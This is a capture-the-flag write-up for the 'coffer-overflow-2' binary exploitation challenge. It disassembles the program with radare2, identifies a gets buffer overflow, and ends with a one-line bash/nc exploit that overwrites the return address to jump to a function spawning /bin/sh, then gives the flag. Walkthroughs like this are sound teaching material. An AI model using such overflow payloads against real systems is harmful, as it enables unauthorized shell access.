# coffer-overflow-2

## Description

NotDeGhost

You'll have to jump to a function now!?

## Solution

Once again, we're given a binary and source code.

The description suggests that we'll have to jump to a function, so let's list functions in the binary.

```asm
[0x00400590]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x00400590]> afl
0x00400590    1 42           entry0
0x004005d0    4 42   -> 37   sym.deregister_tm_clones
0x00400600    4 58   -> 55   sym.register_tm_clones
0x00400640    3 34   -> 29   sym.__do_global_dtors_aux
0x00400670    1 7            entry.init0
0x00400770    1 2            sym.__libc_csu_fini
0x00400774    1 9            sym._fini
0x00400700    4 101          sym.__libc_csu_init
0x004005c0    1 2            sym._dl_relocate_static_pie
0x00400677    1 111          main
0x00400560    1 6            sym.imp.setbuf
0x00400550    1 6            sym.imp.puts
0x00400580    1 6            sym.imp.gets
0x004006e6    1 24           sym.binFunction
0x00400570    1 6            sym.imp.system
0x00400528    3 23           sym._init
[0x00400590]>
```

The two functions of interest are `main` and `sym.binFunction`, the latter of which is a custom function.
If we disassemble `sym.binFunction`, we get the following:

```asm
[0x00400590]> pdf @ sym.binFunction
┌ 24: sym.binFunction ();
│           0x004006e6      55             push rbp
│           0x004006e7      4889e5         mov rbp, rsp
│           0x004006ea      488d3d120100.  lea rdi, str.bin_sh         ; 0x400803 ; "/bin/sh" ; const char *string
│           0x004006f1      b800000000     mov eax, 0
│           0x004006f6      e875feffff     call sym.imp.system         ; int system(const char *string)
│           0x004006fb      90             nop
│           0x004006fc      5d             pop rbp
└           0x004006fd      c3             ret
[0x00400590]>
```

The function simply calls `system` and passes `"/bin/sh"` as a parameter.
If we can call this function, we can spawn a shell and read the flag file.
To do so, we'll need the address `0x004006e6`, which marks the start of the function.

Next, let's disassemble `main` to find vulnerabilities we can use to call the above function.

```asm
[0x00400590]> pdf @ main
            ; DATA XREF from entry0 @ 0x4005ad
┌ 111: int main (int argc, char **argv, char **envp);
│           ; var char *s @ rbp-0x10
│           0x00400677      55             push rbp
│           0x00400678      4889e5         mov rbp, rsp
│           0x0040067b      4883ec10       sub rsp, 0x10
│           0x0040067f      488b05da0920.  mov rax, qword [obj.stdout] ; obj.stdout__GLIBC_2.2.5
│                                                                      ; [0x601060:8]=0
│           0x00400686      be00000000     mov esi, 0                  ; char *buf
│           0x0040068b      4889c7         mov rdi, rax                ; FILE *stream
│           0x0040068e      e8cdfeffff     call sym.imp.setbuf         ; void setbuf(FILE *stream, char *buf)
│           0x00400693      488b05d60920.  mov rax, qword [obj.stdin]  ; obj.stdin__GLIBC_2.2.5
│                                                                      ; [0x601070:8]=0
│           0x0040069a      be00000000     mov esi, 0                  ; char *buf
│           0x0040069f      4889c7         mov rdi, rax                ; FILE *stream
│           0x004006a2      e8b9feffff     call sym.imp.setbuf         ; void setbuf(FILE *stream, char *buf)
│           0x004006a7      488b05d20920.  mov rax, qword [obj.stderr] ; obj.stderr__GLIBC_2.2.5
│                                                                      ; [0x601080:8]=0
│           0x004006ae      be00000000     mov esi, 0                  ; char *buf
│           0x004006b3      4889c7         mov rdi, rax                ; FILE *stream
│           0x004006b6      e8a5feffff     call sym.imp.setbuf         ; void setbuf(FILE *stream, char *buf)
│           0x004006bb      488d3dc60000.  lea rdi, str.Welcome_to_coffer_overflow__where_our_coffers_are_overfilling_with_bytes ; 0x400788 ; "Welcome to coffer overflow, where our coffers are overfilling with bytes ;)" ; const char *s
│           0x004006c2      e889feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004006c7      488d3d0a0100.  lea rdi, str.What_do_you_want_to_fill_your_coffer_with ; 0x4007d8 ; "What do you want to fill your coffer with?" ; const char *s
│           0x004006ce      e87dfeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004006d3      488d45f0       lea rax, [s]
│           0x004006d7      4889c7         mov rdi, rax                ; char *s
│           0x004006da      e8a1feffff     call sym.imp.gets           ; char *gets(char *s)
│           0x004006df      b800000000     mov eax, 0
│           0x004006e4      c9             leave
└           0x004006e5      c3             ret
[0x00400590]> 
```

Again, we can see there is an unsafe call to `gets`.
We can use this to overwrite the return address of `main` and direct the flow of execution to our win function.

`gets` is storing user input in a variable at `rbp-0x10`, or 16 bytes on top of the base pointer.
As this is a 86x-64 program, the base pointer and return address are both 8 bytes long.
Therefore, the payload consists of 24 bytes of padding, followed by the address of `sym.binFunction` in little endian.

`cat` is used to redirect `stdin` to `stdout` and allow us to interact with the newly spawned shell to read the flag file.

## Exploit Script

```asm
#!/bin/bash

(echo -e AAAAAAAAAAAAAAAABBBBBBBB'\xe6\x06\x40\x00\x00\x00\x00\x00'; cat) | nc 2020.redpwnc.tf 31908
```

## Flag

```flag{ret_to_b1n_m0re_l1k3_r3t_t0_w1n}```

